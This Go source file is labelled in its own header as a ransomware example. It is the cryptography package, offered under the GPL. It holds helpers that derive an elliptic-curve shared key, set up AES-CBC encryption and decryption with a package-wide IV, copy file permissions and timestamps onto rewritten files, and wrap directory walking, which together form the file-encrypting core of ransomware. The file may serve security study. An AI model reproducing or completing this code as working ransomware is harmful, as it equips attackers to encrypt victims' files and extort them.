// Ransomware example in Golang
// Copyright (C) 2017 Gustavo Henrique

// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>

package cryptography

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/sha256"
	"os"
	"path/filepath"
)

func GenSharedKey(privKey *ecdsa.PrivateKey, pubKey *ecdsa.PublicKey) ([]byte, error) {
	curve := elliptic.P256()
	x, _ := curve.ScalarMult(pubKey.X, pubKey.Y, privKey.D.Bytes())
	digest := sha256.Sum256(x.Bytes())
	return digest[:], nil
}

func GetCipherBlockMode(key []byte, mode CipherMode) (cipher.BlockMode, error) {
	aesBlock, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	if mode == ENCRYPT_MODE {
		return cipher.NewCBCEncrypter(aesBlock, iv), nil
	}
	return cipher.NewCBCDecrypter(aesBlock, iv), nil
}

func CopyFileMetadata(srcFileInfo os.FileInfo, destFile string) error {
	err := os.Chmod(destFile, srcFileInfo.Mode())

	if err != nil {
		return err
	}

	os.Chtimes(destFile, srcFileInfo.ModTime(), srcFileInfo.ModTime())
	return err
}

func WalkFuncDecorator(walkFn filepath.WalkFunc) filepath.WalkFunc {
	return func(path string, fi os.FileInfo, e error) error {
		err := walkFn(path, fi, e)
		return err
	}
}

func Exists(name string) bool {
	_, err := os.Stat(name)
	return !os.IsNotExist(err)
}
